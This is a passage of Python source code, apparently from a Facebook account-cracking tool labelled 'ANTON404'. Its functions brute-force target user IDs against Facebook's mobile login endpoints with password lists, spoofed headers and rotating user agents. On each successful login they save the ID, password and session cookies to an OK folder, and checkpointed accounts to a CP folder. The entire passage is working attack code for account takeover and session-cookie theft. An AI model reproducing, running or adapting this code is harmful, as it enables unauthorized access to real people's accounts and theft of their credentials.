526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login.php?skip_api_login=1&api_key=1722713787887984&kid_directed_site=0&app_id=1722713787887984&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			anton=ses.cookies.get_dict().keys()
			if "c_user" in anton:
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f"\r {hijo}[ANTON404-OK] %s | %s | {mer}{tahun(idf)}"%(idf,pw))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in anton:
				cp+=1
				#print(f"\r {kun}[ANTON404-CP] %s | %s"%(idf,pw))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	loop+=1
	
#-----------------------[ METHOD REGULER ]--------------------#
def asyin3(idf,pwv):
	global loop,ok,cp
	dm = random.choice([A,R,Y,G,B,G1,G2,G3,G4,G5,X,X1,X2,X3,X4,X5,S,M])
	sys.stdout.write(f"\r %s[ANTON404-M3] {dm}{loop}{A}|%sOK-:{ok}%s|%sCP-:{cp}"%(puti,hijo,puti,kun));sys.stdout.flush()
	ses = requests.Session()
	ua = random.choice(ugen)
	for pw in pwv:
		try: 
			p = ses.get('https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://x.facebook.com/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=af919600-a681-4aeb-a128-05e90339859f&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			anton=ses.cookies.get_dict().keys()
			if "c_user" in anton:
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f"\r {hijo}[ANTON404-OK] %s | %s | {mer}{tahun(idf)}"%(idf,pw))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in anton:
				#print(f"\r{kun} [ANTON404-CP] %s | %s | %s"%(idf,pw,tahun(idf)))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'|'+tahun(idf)+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1

#-----------------------[ METHOD REGULER ]--------------------#
if __name__ == '__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	login()
	
